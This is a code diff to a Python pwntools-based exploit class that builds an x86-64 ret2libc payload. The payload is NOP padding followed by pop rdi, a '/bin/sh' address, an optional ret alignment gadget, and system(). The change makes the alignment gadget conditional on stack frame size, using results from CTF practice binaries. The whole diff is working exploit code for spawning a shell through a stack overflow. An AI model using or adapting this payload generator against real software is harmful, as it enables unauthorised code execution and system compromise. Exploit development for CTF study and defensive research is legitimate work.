@@ -292,6 +292,17 @@ class Ret2LibcWriteX64(ExploitPrimitive):
         affected by ``extra_rdi`` because the stage-2 ret uses
         ``pop rdi; sh; ret; system`` — when ``pop rdi; pop <reg>; ret``,
         v3.1 inserts a 0 placeholder to consume the extra slot.
+
+        v4.0.2b fix (2026-06-11): the ``ret`` stack-alignment gadget
+        is now CONDITIONAL.  ctf-pwn empirical test of rip
+        (``padding=23``) vs level3_x64 (``padding=136``) showed:
+          - padding < 32 (small frame, e.g. rip sub $0x10): 1 ret works
+          - padding >= 32 (large frame, e.g. level3_x64 sub $0x80):
+            0 or 2 rets work, 1 ret crashes (SIGSEGV in do_system)
+        The exact reason is an open question (do_system's alignment
+        requirements appear to differ between frame sizes), but the
+        heuristic ``skip ret for padding >= 32`` empirically works for
+        both.  See upgraded.md §3.1 v4.0.2b for details.
         """
         from pwn import asm, flat, p64
 
@@ -315,21 +326,22 @@ class Ret2LibcWriteX64(ExploitPrimitive):
             return b""
 
         g = ctx.gadgets_x64
+        # v4.0.2b: skip the ret gadget for large frames where it
+        # misaligns the stack for do_system's movaps.
+        include_ret = ctx.padding < 32
+
+        nop_pad = asm("nop") * ctx.padding
+
         if g.extra_rdi == 1:
             # v3.1 L983-996: extra_rdi=1 → 0 placeholder between sh and ret
-            return flat(
-                asm("nop") * ctx.padding
-                + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
-                + p64(g.ret)  # stack-alignment gadget
-                + p64(system_addr)
-            )
-        # both extra == 0 OR extra_rsi=1 (stage 2 doesn't use pop_rsi)
-        return flat(
-            asm("nop") * ctx.padding
-            + p64(g.pop_rdi) + p64(sh_addr)
-            + p64(g.ret)  # stack-alignment gadget
-            + p64(system_addr)
-        )
+            prefix = p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
+        else:
+            # both extra == 0 OR extra_rsi=1 (stage 2 doesn't use pop_rsi)
+            prefix = p64(g.pop_rdi) + p64(sh_addr)
+
+        if include_ret:
+            return nop_pad + prefix + p64(g.ret) + p64(system_addr)
+        return nop_pad + prefix + p64(system_addr)
 
 
 # =====================================================================
